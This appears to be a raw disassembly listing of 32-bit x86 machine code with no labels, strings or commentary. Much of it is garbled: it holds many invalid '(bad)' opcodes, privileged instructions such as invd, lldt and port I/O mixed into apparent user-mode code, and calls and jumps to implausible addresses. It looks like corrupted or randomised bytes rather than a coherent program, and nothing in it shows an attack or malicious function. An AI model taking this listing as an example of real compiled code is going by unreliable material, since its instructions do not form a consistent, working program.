  40169f:	0d e2 13 40 00       	or     $0x4013e2,%eax
  4016a4:	4d                   	dec    %ebp
  4016a5:	13 e4                	adc    %esp,%esp
  4016a7:	00 81 b7 40 00 5b    	add    %al,0x5b0040b7(%ecx)
  4016ad:	12 40 1b             	adc    0x1b(%eax),%al
  4016b0:	64 16                	fs push %ss
  4016b2:	40                   	inc    %eax
  4016b3:	d1 9a 14 9b 00 12    	rcrl   $1,0x12009b14(%edx)
  4016b9:	11 40 00             	adc    %eax,0x0(%eax)
  4016bc:	02 11                	add    (%ecx),%dl
  4016be:	40                   	inc    %eax
  4016bf:	85 62 11             	test   %esp,0x11(%edx)
  4016c2:	40                   	inc    %eax
  4016c3:	00 6d 11             	add    %ch,0x11(%ebp)
  4016c6:	40                   	inc    %eax
  4016c7:	00 4e 19             	add    %cl,0x19(%esi)
  4016ca:	40                   	inc    %eax
  4016cb:	00 b0 15 f4 00 2a    	add    %dh,0x2a00f415(%eax)
  4016d1:	11 40 00             	adc    %eax,0x0(%eax)
  4016d4:	3f                   	aas
  4016d5:	10 4f 00             	adc    %cl,0x0(%edi)
  4016d8:	bf 5a 40 00 8c       	mov    $0x8c00405a,%edi
  4016dd:	11 40 00             	adc    %eax,0x0(%eax)
  4016e0:	f7 10                	notl   (%eax)
  4016e2:	40                   	inc    %eax
  4016e3:	00 1a                	add    %bl,(%edx)
  4016e5:	66 40                	inc    %ax
  4016e7:	00 5d 4b             	add    %bl,0x4b(%ebp)
  4016ea:	7d 00                	jge    0x4016ec
  4016ec:	2b 11                	sub    (%ecx),%edx
  4016ee:	40                   	inc    %eax
  4016ef:	00 29                	add    %ch,(%ecx)
  4016f1:	12 40 00             	adc    0x0(%eax),%al
  4016f4:	76 07                	jbe    0x4016fd
  4016f6:	40                   	inc    %eax
  4016f7:	ad                   	lods   %ds:(%esi),%eax
  4016f8:	85 a6 40 00 df b4    	test   %esp,-0x4b20ffc0(%esi)
  4016fe:	06                   	push   %es
  4016ff:	00 58 6a             	add    %bl,0x6a(%eax)
  401702:	40                   	inc    %eax
  401703:	00 16                	add    %dl,(%esi)
  401705:	15 40 00 12 1b       	adc    $0x1b120040,%eax
  40170a:	01 1b                	add    %ebx,(%ebx)
  40170c:	1b 1b                	sbb    (%ebx),%ebx
  40170e:	ad                   	lods   %ds:(%esi),%eax
  40170f:	02 1b                	add    (%ebx),%bl
  401711:	b0 1b                	mov    $0x1b,%al
  401713:	1b 1b                	sbb    (%ebx),%ebx
  401715:	1b 1b                	sbb    (%ebx),%ebx
  401717:	03 1b                	add    (%ebx),%ebx
  401719:	1b 04 05 1b 06 17 07 	sbb    0x717061b(,%eax,1),%eax
  401720:	4c                   	dec    %esp
  401721:	1b 1c 1b             	sbb    (%ebx,%ebx,1),%ebx
  401724:	1b de                	sbb    %esi,%ebx
  401726:	1b 13                	sbb    (%ebx),%edx
  401728:	0f 08                	invd
  40172a:	09 0a                	or     %ecx,(%edx)
  40172c:	0b 41 8a             	or     -0x76(%ecx),%eax
  40172f:	0d 0e 1b 0f 1b       	or     $0x1b0f1b0e,%eax
  401734:	1b 10                	sbb    (%eax),%edx
  401736:	1b 21                	sbb    (%ecx),%esp
  401738:	12 13                	adc    (%ebx),%dl
  40173a:	fb                   	sti
  40173b:	f5                   	cmc
  40173c:	15 16 17 18 19       	adc    $0x19181716,%eax
  401741:	c6                   	(bad)
  401742:	90                   	nop
  401743:	90                   	nop
  401744:	90                   	nop
  401745:	90                   	nop
  401746:	21 90 da 90 90 90    	and    %edx,-0x6f6f6f26(%eax)
  40174c:	6a 90                	push   $0xffffff90
  40174e:	90                   	nop
  40174f:	90                   	nop
  401750:	55                   	push   %ebp
  401751:	8b 85 8b 45 08 8b    	mov    -0x74f7ba75(%ebp),%eax
  401757:	0d c8 40 40 00       	or     $0x4040c8,%eax
  40175c:	50                   	push   %eax
  40175d:	83 c1 40             	add    $0x40,%ecx
  401760:	59                   	pop    %ecx
  401761:	39 a9 40 00 51 c5    	cmp    %ebp,-0x3aaeffc0(%ecx)
  401767:	9a 80 c1 40 00 a1 d7 	lcall  $0xd7a1,$0x40c180
  40176e:	02 41 00             	add    0x0(%ecx),%al
  401771:	83 c4 0c             	add    $0xc,%esp
  401774:	85 c0                	test   %eax,%eax
  401776:	74 0f                	je     0x401787
  401778:	50                   	push   %eax
  401779:	2f                   	das
  40177a:	54                   	push   %esp
  40177b:	d2 40 dd             	rolb   %cl,-0x23(%eax)
  40177e:	ff 15 64 c1 40 5c    	call   *0x5c40c164
  401784:	83 c4 08             	add    $0x8,%esp
  401787:	6a 01                	push   $0x1
  401789:	e9 15 70 c1 40       	jmp    0x410187a3
  40178e:	9e                   	sahf
  40178f:	90                   	nop
  401790:	55                   	push   %ebp
  401791:	8b ec                	mov    %esp,%ebp
  401793:	88 dc                	mov    %bl,%ah
  401795:	b8 46 00 b4 a1       	mov    $0xa1b40046,%eax
  40179a:	0a 02                	or     (%edx),%al
  40179c:	41                   	inc    %ecx
  40179d:	00 b7 c0 15 4c 40    	add    %dh,0x404c15c0(%edi)
  4017a3:	41                   	inc    %ecx
  4017a4:	00 74 a3 68          	add    %dh,0x68(%ebx,%eiz,4)
  4017a8:	40                   	inc    %eax
  4017a9:	3c 41                	cmp    $0x41,%al
  4017ab:	00 50 e8             	add    %dl,-0x18(%eax)
  4017ae:	9e                   	sahf
  4017af:	40                   	inc    %eax
  4017b0:	7d fc                	jge    0x4017ae
  4017b2:	66 8b 0d 97 02 22 00 	mov    0x220297,%cx
  4017b9:	eb 14                	jmp    0x4017cf
  4017bb:	8b 15 00 18 41 00    	mov    0x411800,%edx
  4017c1:	28 50 e8             	sub    %dl,-0x18(%eax)
  4017c4:	fe 40 00             	incb   0x0(%eax)
  4017c7:	00 66 8b             	add    %ah,-0x75(%esi)
  4017ca:	0d f4 21 41 00       	or     $0x4121f4,%eax
  4017cf:	dd 08                	fisttpll (%eax)
  4017d1:	18 46 00             	sbb    %al,0x0(%esi)
  4017d4:	a1 37 02 37 00       	mov    0x370237,%eax
  4017d9:	53                   	push   %ebx
  4017da:	56                   	push   %esi
  4017db:	8b 35 6e c1 40 55    	mov    0x5540c16e,%esi
  4017e1:	81 89 0d b4 d4 41 dc 	orl    $0x57c085dc,0x41d4b40d(%ecx)
  4017e8:	85 c0 57 
  4017eb:	75 5d                	jne    0x40184a
  4017ed:	d2 15 00 18 41 00    	rclb   %cl,0x411800
  4017f3:	52                   	push   %edx
  4017f4:	2d 98 d4 40 00       	sub    $0x40d498,%eax
  4017f9:	ab                   	stos   %eax,%es:(%edi)
  4017fa:	d6                   	salc
  4017fb:	a1 78 d5 41 00       	mov    0x41d578,%eax
  401800:	9e                   	sahf
  401801:	1b d5                	sbb    %ebp,%edx
  401803:	85 c0                	test   %eax,%eax
  401805:	d3 15 a1 7d 02 41    	rcll   %cl,0x41027da1
  40180b:	ae                   	scas   %es:(%edi),%al
  40180c:	50                   	push   %eax
  40180d:	62 40 3c             	bound  %eax,0x3c(%eax)
  401810:	41                   	inc    %ecx
  401811:	00 68 84             	add    %ch,-0x7c(%eax)
  401814:	d4 40                	aam    $0x40
  401816:	00 ff                	add    %bh,%bh
  401818:	d6                   	salc
  401819:	83 b2 0c a1 14 d0 40 	xorl   $0x40,-0x2feb5ef4(%edx)
  401820:	00 85 c0 0b 80 d4    	add    %al,-0x2b7ff440(%ebp)
  401826:	a0 2a d5 e4 b8       	mov    0xb8e4d52a,%al
  40182b:	7c d4                	jl     0x401801
  40182d:	40                   	inc    %eax
  40182e:	00 50 68             	add    %dl,0x68(%eax)
  401831:	6c                   	insb   (%dx),%es:(%edi)
  401832:	d4 40                	aam    $0x40
  401834:	00 ff                	add    %bh,%bh
  401836:	d6                   	salc
  401837:	8b 0d c8 c0 81 af    	mov    0xaf81c0c8,%ecx
  40183d:	83 cb 20             	or     $0x20,%ebx
  401840:	51                   	push   %ecx
  401841:	ff 15 a0 c1 40 00    	call   *0x40c1a0
  401847:	83 c4 0c             	add    $0xc,%esp
  40184a:	8b 15 18 d0 40 60    	mov    0x6040d018,%edx
  401850:	8b 35 58 6b 40 33    	mov    0x33406b58,%esi
  401856:	68 60 a9 00 37       	push   $0x3700a960
  40185b:	94                   	xchg   %eax,%esp
  40185c:	46                   	inc    %esi
  40185d:	d6                   	salc
  40185e:	a3 b0 0b 41 c7       	mov    %eax,0xc7410bb0
  401863:	a1 10 d0 40 00       	mov    0x40d010,%eax
  401868:	38 20                	cmp    %ah,(%eax)
  40186a:	04 b1                	add    $0xb1,%al
  40186c:	d6                   	salc
  40186d:	8b 13                	mov    (%ebx),%edx
  40186f:	4c                   	dec    %esp
  401870:	40                   	inc    %eax
  401871:	07                   	pop    %es
  401872:	ef                   	out    %eax,(%dx)
  401873:	8b eb                	mov    %ebx,%ebp
  401875:	18 d0                	sbb    %dl,%al
  401877:	40                   	inc    %eax
  401878:	00 83 c4 3d 68 c8    	add    %al,-0x3797c23c(%ebx)
  40187e:	0b 41 fd             	or     -0x3(%ecx),%eax
  401881:	6a 00                	push   $0x0
  401883:	51                   	push   %ecx
  401884:	52                   	push   %edx
  401885:	68 f8 17 41 00       	push   $0x4117f8
  40188a:	e8 81 47 00 00       	call   0x406010
  40188f:	85 c0                	test   %eax,%eax
  401891:	74 0e                	je     0x4018a1
  401893:	50                   	push   %eax
  401894:	68 50 d4 40 00       	push   $0x40d450
  401899:	e8 a2 1e 00 00       	call   0x403740
  40189e:	c0 13 08             	rclb   $0x8,(%ebx)
  4018a1:	e6 7c                	out    %al,$0x7c
  4018a3:	c9                   	leave
  4018a4:	4b                   	dec    %ebx
  4018a5:	00 85 c0 75 35 89    	add    %al,-0x76ca8a40(%ebp)
  4018ab:	fb                   	sti
  4018ac:	b0 45                	mov    $0x45,%al
  4018ae:	00 8b 0d 9c 0b 41    	add    %cl,0x410b9c0d(%ebx)
  4018b4:	8b 8b 15 48 40 41    	mov    0x41404815(%ebx),%ecx
  4018ba:	00 6a 00             	add    %ch,0x0(%edx)
  4018bd:	68 9c d1 40 00       	push   $0x40d19c
  4018c2:	50                   	push   %eax
  4018c3:	a1 4c 40 41 4a       	mov    0x4a41404c,%eax
  4018c8:	51                   	push   %ecx
  4018c9:	68 48 d4 40 00       	push   $0x40d448
  4018ce:	52                   	push   %edx
  4018cf:	50                   	push   %eax
  4018d0:	e8 bb 6a 63 9d       	call   0x9da38390
  4018d5:	83 b0 1c a3 48 a7 41 	xorl   $0x41,-0x58b75ce4(%eax)
  4018dc:	00 eb                	add    %ch,%bl
  4018de:	05 a1 48 40 41       	add    $0x414048a1,%eax
  4018e3:	36 8b 66 80          	mov    %ss:-0x80(%esi),%esp
  4018e7:	02 41 00             	add    0x0(%ecx),%al
  4018ea:	85 c9                	test   %ecx,%ecx
  4018ec:	8f                   	(bad)
  4018ed:	26 a9 a7 4c 45 41    	es test $0x41454ca7,%eax
  4018f3:	00 6a a8             	add    %ch,-0x58(%edx)
  4018f6:	68 9c d1 40 6d       	push   $0x6d40d19c
  4018fb:	68 44 d4 40 00       	push   $0x40d444
  401900:	68 28 d4 40 00       	push   $0x40d428
  401905:	50                   	push   %eax
  401906:	a1 99 84 8b 65       	mov    0x658b8499,%eax
  40190b:	00 83 c4 18 a3 48    	add    %al,0x48a318c4(%ebx)
  401911:	40                   	inc    %eax
  401912:	41                   	inc    %ecx
  401913:	00 db                	add    %bl,%bl
  401915:	0d 84 de 41 00       	or     $0x41de84,%eax
  40191a:	85 c9                	test   %ecx,%ecx
  40191c:	75 19                	jne    0x401937
  40191e:	8b 15 4c 40 59 00    	mov    0x59404c,%edx
  401924:	6a 00                	push   $0x0
  401926:	68 18 65 24 00       	push   $0x246518
  40192b:	50                   	push   %eax
  40192c:	52                   	push   %edx
  40192d:	ef                   	out    %eax,(%dx)
  40192e:	5e                   	pop    %esi
  40192f:	3f                   	aas
  401930:	b8 00 83 c4 10       	mov    $0x10c48300,%eax
  401935:	a3 48 21 41 00       	mov    %eax,0x412148
  40193a:	8b 0d 60 02 f0 00    	mov    0xf00260,%ecx
  401940:	54                   	push   %esp
  401941:	c9                   	leave
  401942:	7f 63                	jg     0x4019a7
  401944:	8b 15 68 02 41 00    	mov    0x410268,%edx
  40194a:	be fc d3 40 00       	mov    $0x40d3fc,%esi
  40194f:	85 7a 75             	test   %edi,0x75(%edx)
  401952:	05 be d4 02 41       	add    $0x4102d4be,%eax
  401957:	00 8b 15 78 d3 41    	add    %cl,0x41d37815(%ebx)
  40195d:	00 85 d2 8b 15 40    	add    %al,0x40158bd2(%ebp)
  401963:	a8 41                	test   $0x41,%al
  401965:	00 22                	add    %ah,(%edx)
  401967:	06                   	push   %es
  401968:	8b 15 e4 17 41 00    	mov    0x4117e4,%edx
  40196e:	78 c9                	js     0x401939
  401970:	b9 f8 d3 40 00       	mov    $0x40d3f8,%ecx
  401975:	74 05                	je     0x40197c
  401977:	b9 f0 d3 40 00       	mov    $0x40d3f0,%ecx
  40197c:	50                   	push   %eax
  40197d:	a1 04 18 41 98       	mov    0x98411804,%eax
  401982:	50                   	push   %eax
  401983:	a1 44 40 6d 91       	mov    0x916d4044,%eax
  401988:	50                   	push   %eax
  401989:	56                   	push   %esi
  40198a:	52                   	push   %edx
  40198b:	51                   	push   %ecx
  40198c:	e9 0d 30 d0 40       	jmp    0x4110499e
  401991:	00 7d d4             	add    %bh,-0x2c(%ebp)
  401994:	d3 40 00             	roll   %cl,0x0(%eax)
  401997:	68 00 08 00 00       	push   $0x800
  40199c:	51                   	push   %ecx
  40199d:	55                   	push   %ebp
  40199e:	de 31                	fidivs (%ecx)
  4019a0:	00 5f 91             	add    %bl,-0x6f(%edi)
  4019a3:	c4 13                	les    (%ebx),%edx
  4019a5:	eb 6f                	jmp    0x401a16
  4019a7:	8a 15 40 38 41 00    	mov    0x413840,%dl
  4019ad:	bf 1e 38 41 00       	mov    $0x41381e,%edi
  4019b2:	29 d2                	sub    %edx,%edx
  4019b4:	75 05                	jne    0x4019bb
  4019b6:	bf c8 d3 40 68       	mov    $0x6840d3c8,%edi
  4019bb:	2d 27 68 02 41       	sub    $0x41026827,%eax
  4019c0:	1f                   	pop    %ds
  4019c1:	be fc 19 40 00       	mov    $0x4019fc,%esi
  4019c6:	85 d2                	test   %edx,%edx
  4019c8:	75 05                	jne    0x4019cf
  4019ca:	be d4 02 41 00       	mov    $0x4102d4,%esi
  4019cf:	8b 69 78             	mov    0x78(%ecx),%ebp
  4019d2:	02 41 00             	add    0x0(%ecx),%al
  4019d5:	85 d2                	test   %edx,%edx
  4019d7:	c5 15 40 81 cc 00    	lds    0xcc8140,%edx
  4019dd:	75 06                	jne    0x4019e5
  4019df:	8b 15 e4 17 41 00    	mov    0x4117e4,%edx
  4019e5:	83 f9 01             	cmp    $0x1,%ecx
  4019e8:	e6 c0                	out    %al,$0xc0
  4019ea:	0e                   	push   %cs
  4019eb:	46                   	inc    %esi
  4019ec:	54                   	push   %esp
  4019ed:	74 d0                	je     0x4019bf
  4019ef:	b9 bc d3 40 00       	mov    $0x40d3bc,%ecx
  4019f4:	50                   	push   %eax
  4019f5:	a1 70 02 70 61       	mov    0x61700270,%eax
  4019fa:	50                   	push   %eax
  4019fb:	22 a1 1d 18 41 00    	and    0x41181d(%ecx),%ah
  401a01:	50                   	push   %eax
  401a02:	a1 44 c9 41 00       	mov    0x41c944,%eax
  401a07:	50                   	push   %eax
  401a08:	56                   	push   %esi
  401a09:	52                   	push   %edx
  401a0a:	51                   	push   %ecx
  401a0b:	8b 0d 30 d0 40 00    	mov    0x40d030,%ecx
  401a11:	68 78 d3 40 00       	push   $0x40d378
  401a16:	68 00 08 19 00       	push   $0x190800
  401a1b:	16                   	push   %ss
  401a1c:	e8 61 6c 00 00       	call   0x408682
  401a21:	83 c4 2c             	add    $0x2c,%esp
  401a24:	3d cf 08 00 00       	cmp    $0x8cf,%eax
  401a29:	72 0d                	jb     0x401a38
  401a2b:	68 64 d3 82 00       	push   $0x82d364
  401a30:	ff 1b                	lcall  *(%ebx)
  401a32:	fd                   	std
  401a33:	ff                   	(bad)
  401a34:	ff c6                	inc    %esi
  401a36:	c4 04 a1             	les    (%ecx,%eiz,4),%eax
  401a39:	b9 3a 41 ae bb       	mov    $0xbbae413a,%ecx
  401a3e:	02 00                	add    (%eax),%al
  401a40:	f8                   	clc
  401a41:	00 3b                	add    %bh,(%ebx)
  401a43:	c3                   	ret
  401a44:	7c 7d                	jl     0x401ac3
  401a46:	a1 60 02 a9 be       	mov    0xbea90260,%eax
  401a4b:	3b c3                	cmp    %ebx,%eax
  401a4d:	b8 bc 54 40 00       	mov    $0x4054bc,%eax
  401a52:	74 05                	je     0x401a59
  401a54:	2f                   	das
  401a55:	c0 f5 40             	shl    $0x40,%ch
  401a58:	d8 8b 21 30 d0 07    	fmuls  0x7d03021(%ebx)
  401a5e:	e7 52                	out    %eax,$0x52
  401a60:	50                   	push   %eax
  401a61:	68 44 d3 dd bf       	push   $0xbfddd344
  401a66:	ff 15 64 c1 40 7f    	call   *0x7f40c164
  401a6c:	b1 c4                	mov    $0xc4,%cl
  401a6e:	9c                   	pushf
  401a6f:	8b 3d b7 d0 40 60    	mov    0x6040d0b7,%edi
  401a75:	83 c9 ff             	or     $0xffffffff,%ecx
  401a78:	33 c0                	xor    %eax,%eax
  401a7a:	f2 ae                	repnz scas %es:(%edi),%al
  401a7c:	ae                   	scas   %es:(%edi),%al
  401a7d:	60                   	pusha
  401a7e:	02 41 00             	add    0x0(%ecx),%al
  401a81:	f7 6d 9a             	imull  -0x66(%ebp)
  401a84:	83 aa 01 89 0d ec 17 	subl   $0x17,-0x13f276ff(%edx)
  401a8b:	41                   	inc    %ecx
  401a8c:	00 7c 70 a1          	add    %bh,-0x5f(%eax,%esi,2)
  401a90:	70 02                	jo     0x401a94
  401a92:	41                   	inc    %ecx
  401a93:	00 8d 4c 29 00 45    	add    %cl,0x4500294c(%ebp)
  401a99:	ff 15 5c c1 40 96    	call   *0x9640c15c
  401a9f:	d9 6e 04             	fldcw  0x4(%esi)
  401aa2:	85 c0                	test   %eax,%eax
  401aa4:	75 1f                	jne    0x401ac5
  401aa6:	8b 6a c8             	mov    -0x38(%edx),%ebp
  401aa9:	c7 40 00 68 14 d3 40 	movl   $0x40d31468,0x0(%eax)
  401ab0:	00 83 c2 40 52 ff    	add    %al,-0xadbf3e(%ebx)
  401ab6:	15 80 c1 40 00       	adc    $0x40c180,%eax
  401abb:	94                   	xchg   %eax,%esp
  401abc:	c4 47 5f             	les    0x5f(%edi),%eax
  401abf:	5e                   	pop    %esi
  401ac0:	5b                   	pop    %ebx
  401ac1:	27                   	daa
  401ac2:	e8 5d c3 8b 38       	call   0x38cbde24
  401ac7:	30 d0                	xor    %dl,%al
  401ac9:	40                   	inc    %eax
  401aca:	00 8b f0 8a 0a 42    	add    %cl,0x420a8af0(%ebx)
  401ad0:	88 0e                	mov    %cl,(%esi)
  401ad2:	46                   	inc    %esi
  401ad3:	84 9a 5d f6 8b 15    	test   %bl,0x158bf65d(%edx)
  401ad9:	ec                   	in     (%dx),%al
  401ada:	17                   	pop    %ss
  401adb:	41                   	inc    %ecx
  401adc:	00 8b 0d 70 02 02    	add    %cl,0x202700d(%ebx)
  401ae2:	00 8b 35 20 38 41    	add    %cl,0x41382035(%ebx)
  401ae8:	00 cd                	add    %cl,%ch
  401aea:	35 02 60 d0 c1       	xor    $0xc1d06002,%eax
  401aef:	e9 0e f3 a5 8b       	jmp    0x8be60e02
  401af4:	ca 83 e1             	lret   $0xe183
  401af7:	03 f3                	add    %ebx,%esi
  401af9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401afa:	a3 30 d0 40 00       	mov    %eax,0x40d030
  401aff:	a1 4c a9 41 00       	mov    0x41a94c,%eax
  401b04:	d8 8b 0d b4 ea 41    	fmuls  0x41eab40d(%ebx)
  401b0a:	00 8b 15 08 18 19    	add    %cl,0x19180815(%ebx)
  401b10:	00 45 6a             	add    %al,0x6a(%ebp)
  401b13:	3b f1                	cmp    %ecx,%esi
  401b15:	6a 00                	push   $0x0
  401b17:	52                   	push   %edx
  401b18:	1a ac 17 41 00 e8 0e 	sbb    0xee80041(%edi,%edx,1),%ch
  401b1f:	54                   	push   %esp
  401b20:	00 00                	add    %al,(%eax)
  401b22:	8b f0                	mov    %eax,%esi
  401b24:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  401b26:	f6 74 2c a1          	divb   -0x5f(%esp,%ebp,1)
  401b2a:	08 18                	or     %bl,(%eax)
  401b2c:	41                   	inc    %ecx
  401b2d:	00 8d 8d 48 ff ff    	add    %cl,-0xb773(%ebp)
  401b33:	ff e2                	jmp    *%edx
  401b35:	68 f4 d2 40 00       	push   $0x40d2f4
  401b3a:	6a 78                	push   $0x78
  401b3c:	51                   	push   %ecx
  401b3d:	e8 3e 42 00 00       	call   0x405d80
  401b42:	59                   	pop    %ecx
  401b43:	bf d6 8d 85 29       	mov    $0x29858dd6,%edi
  401b48:	42                   	inc    %edx
  401b49:	ff                   	(bad)
  401b4a:	ff 52 50             	call   *0x50(%edx)
  401b4d:	e8 ee 15 00 00       	call   0x403140
  401b52:	83 2f 18             	subl   $0x18,(%edi)
  401b55:	e8 0c 4e 20 00       	call   0x606966
  401b5a:	8b ae a1 64 02 41    	mov    0x410264a1(%esi),%ebp
  401b60:	a2 8e fa 89 e0       	mov    %al,0xe089fa8e
  401b65:	a0 85 41 00 85       	mov    0x85004185,%al
  401b6a:	c0 89 3d a4 0b 41 e6 	rorb   $0xe6,0x410ba43d(%ecx)
  401b71:	91                   	xchg   %eax,%ecx
  401b72:	35 c0 0b 41 00       	xor    $0x410bc0,%eax
  401b77:	89 3d c4 df 41 00    	mov    %edi,0x41dfc4
  401b7d:	d6                   	salc
  401b7e:	1b 99 6a 00 68 40    	sbb    0x4068006a(%ecx),%ebx
  401b84:	37                   	aaa
  401b85:	0f 00 52 a6          	lldt   -0x5a(%edx)
  401b89:	e8 15 99 5d 00       	call   0x9db4a3
  401b8e:	03 c6                	add    %esi,%eax
  401b90:	4f                   	dec    %edi
  401b91:	d7                   	xlat   %ds:(%ebx)
  401b92:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401b95:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401b98:	eb 0e                	jmp    0x401ba8
  401b9a:	c7                   	(bad)
  401b9b:	3c ec                	cmp    $0xec,%al
  401b9d:	ff 0a                	decl   (%edx)
  401b9f:	ff                   	(bad)
  401ba0:	ff c7                	inc    %edi
  401ba2:	55                   	push   %ebp
  401ba3:	f0 ff                	lock (bad)
  401ba5:	ff                   	(bad)
  401ba6:	ff                   	(bad)
  401ba7:	7f 68                	jg     0x401c11
  401ba9:	60                   	pusha
  401baa:	20 9c 00 53 ff 15 60 	and    %bl,0x6015ff53(%eax,%eax,1)
  401bb1:	c1 40 00 a1          	roll   $0xa1,0x0(%eax)
  401bb5:	18 bf 40 f8 83 c4    	sbb    %bh,-0x3b7c07c0(%edi)
  401bbb:	08 93 f6 85 c0 7e    	or     %dl,0x7ec085f6(%ebx)
  401bc1:	31 33                	xor    %esi,(%ebx)
  401bc3:	ff 8b 0d b0 0b 41    	decl   0x410bb00d(%ebx)
  401bc9:	00 89 90 0f 58 08    	add    %cl,0x8580f90(%ecx)
  401bcf:	00 00                	add    %al,(%eax)
  401bd1:	8b 15 b0 0b 41 00    	mov    0x410bb0,%edx
  401bd7:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  401bda:	50                   	push   %eax
  401bdb:	e8 80 1c 00 00       	call   0x403860
  401be0:	a1 18 d0 71 3c       	mov    0x3c71d018,%eax
  401be5:	83 3f 04             	cmpl   $0x4,(%edi)
  401be8:	46                   	inc    %esi
  401be9:	81 c7 60 08 00 00    	add    $0x860,%edi
  401bef:	8c f0                	mov    %?,%eax
  401bf1:	7c d1                	jl     0x401bc4
  401bf3:	15 0d 18 d0 40       	adc    $0x40d0180d,%eax
  401bf8:	00 8d 55 e8 89 bd    	add    %cl,-0x427617ab(%ebp)
  401bfe:	fc                   	cld
  401bff:	8b 0d 2f d3 40 00    	mov    0x40d32f,%ecx
  401c05:	8d 66 fc             	lea    -0x4(%esi),%esp
  401c08:	52                   	push   %edx
  401c09:	8b 15 28 d0 40 00    	mov    0x40d028,%edx
  401c0f:	50                   	push   %eax
  401c10:	a1 f8 3d 41 00       	mov    0x413df8,%eax
  401c15:	92                   	xchg   %eax,%edx
  401c16:	1b 50 e8             	sbb    -0x18(%eax),%edx
  401c19:	83 47 d2 a3          	addl   $0xffffffa3,-0x2e(%edi)
  401c1d:	40                   	inc    %eax
  401c1e:	c0 74 0e 50 68       	shlb   $0x68,0x50(%esi,%ecx,1)
  401c23:	e8 d2 40 00 e8       	call   0xe8405cfa
  401c28:	14 02                	adc    $0x2,%al
  401c2a:	00 00                	add    %al,(%eax)
  401c2c:	83 c4 08             	add    $0x8,%esp
  401c2f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401c32:	70 c0                	jo     0x401bf4
  401c34:	75 c4                	jne    0x401bfa
  401c36:	88 1c d2             	mov    %bl,(%edx,%edx,8)
  401c39:	40                   	inc    %eax
  401c3a:	00 af 10 33 ff ff    	add    %ch,-0xccf0(%edi)
  401c40:	83 c4 04             	add    $0x4,%esp
  401c43:	67 45                	addr16 inc %ebp
  401c45:	5f                   	pop    %edi
  401c46:	c7 45 f4 00 00 de 00 	movl   $0xde0000,-0xc(%ebp)
  401c4d:	85 c0                	test   %eax,%eax
  401c4f:	0f 8e 5f 01 00 00    	jle    0x401db4
  401c55:	cc                   	int3
  401c56:	45                   	inc    %ebp
  401c57:	58                   	pop    %eax
  401c58:	00 00                	add    %al,(%eax)
  401c5a:	00 8f c9 4d f8 8b    	add    %cl,-0x7407b237(%edi)
  401c60:	7b 9e                	jnp    0x401c00
  401c62:	8b 74 01 10          	mov    0x10(%ecx,%eax,1),%esi
  401c66:	8b 4e 08             	mov    0x8(%esi),%ecx
  401c69:	c2 c9 0f             	ret    $0xfc9
  401c6c:	84 28                	test   %ch,(%eax)
  401c6e:	01 00                	add    %eax,(%eax)
  401c70:	b9 c6 55 f8 66       	mov    $0x66f855c6,%ecx
  401c75:	8b 5c 02 0a          	mov    0xa(%edx,%eax,1),%ebx
  401c79:	f6 c3 23             	test   $0x23,%bl
  401c7c:	74 09                	je     0x401c87
  401c7e:	56                   	push   %esi
  401c7f:	98                   	cwtl
  401c80:	dc 1f                	fcompl (%edi)
  401c82:	00 00                	add    %al,(%eax)
  401c84:	83 c4 04             	add    $0x4,%esp
  401c87:	f6 c3 50             	test   $0x50,%bl
  401c8a:	0f 85 e6 61 00 00    	jne    0x407e76
  401c90:	f6 c3 04             	test   $0x4,%bl
  401c93:	0f 84 a6 00 00 00    	je     0x401d3f
  401c99:	3b 2e                	cmp    (%esi),%ebp
  401c9b:	bf 01 0f 85 9e       	mov    $0x9e850f01,%edi
  401ca0:	00 00                	add    %al,(%eax)
  401ca2:	aa                   	stos   %al,%es:(%edi)
  401ca3:	a1 fc 21 41 94       	mov    0x944121fc,%eax
  401ca8:	8b 68 04             	mov    0x4(%eax),%ebp
  401cab:	50                   	push   %eax
  401cac:	b8 e8 8e 4b d7       	mov    $0xd74b8ee8,%eax
  401cb1:	00 b5 0d f8 7b 41    	add    %dh,0x417bf80d(%ebp)
  401cb7:	00 8b 45 04 8b f8    	add    %cl,-0x774fbbb(%ebx)
  401cbd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401cc0:	82 51 c7 45          	adcb   $0x45,-0x39(%ecx)
  401cc4:	9e                   	sahf
  401cc5:	01 00                	add    %eax,(%eax)
  401cc7:	32 00                	xor    (%eax),%al
  401cc9:	89 55 cc             	mov    %edx,-0x34(%ebp)
  401ccc:	36 2f                	ss das
  401cce:	45                   	inc    %ebp
  401ccf:	00 00                	add    %al,(%eax)
  401cd1:	66 85 53 74          	test   %dx,0x74(%ebx)
  401cd5:	57                   	push   %edi
  401cd6:	8b 56 04             	mov    0x4(%esi),%edx
  401cd9:	52                   	push   %edx
  401cda:	e8 31 4b 23 00       	call   0x636810
  401cdf:	f9                   	stc
  401ce0:	30 c4                	xor    %al,%ah
  401ce2:	02 41 eb             	add    -0x15(%ecx),%al
  401ce5:	a1 b8 02 bd 00       	mov    0xbd02b8,%eax
  401cea:	43                   	inc    %ebx
  401ceb:	8b 62 40             	mov    0x40(%edx),%esp
  401cee:	83 0d c3 89 1d e3 02 	orl    $0x2,0xe31d89c3
  401cf5:	d5 bd                	aad    $0xbd
  401cf7:	a3 b8 02 41 00       	mov    %eax,0x4102b8
  401cfc:	7e e2                	jle    0x401ce0
  401cfe:	8b 16                	mov    (%esi),%edx
  401d00:	c8 3b 40 00          	enter  $0x403b,$0x0
  401d04:	68 b0 d2 40 2a       	push   $0x2a40d2b0
  401d09:	83 c2 40             	add    $0x40,%edx
  401d0c:	bb ff 15 80 c1       	mov    $0xc18015ff,%ebx
  401d11:	40                   	inc    %eax
  401d12:	00 0f                	add    %cl,(%edi)
  401d14:	bf 8f 50 68 98       	mov    $0x9868508f,%edi
  401d19:	d2 8b 00 e8 1f 01    	rorb   %cl,0x11fe800(%ebx)
  401d1f:	99                   	cltd
  401d20:	00 83 86 5f c7 46    	add    %al,0x46c75f86(%ebx)
  401d26:	08 00                	or     %al,(%eax)
  401d28:	00 7a 00             	add    %bh,0x0(%edx)
  401d2b:	eb 63                	jmp    0x401d90
  401d2d:	c7 46 08 02 00 00 00 	movl   $0x2,0x8(%esi)
  401d34:	f8                   	clc
  401d35:	15 a8 02 41 00       	adc    $0x4102a8,%eax
  401d3a:	44                   	inc    %esp
  401d3b:	89 15 a8 02 41 00    	mov    %edx,0x4102a8
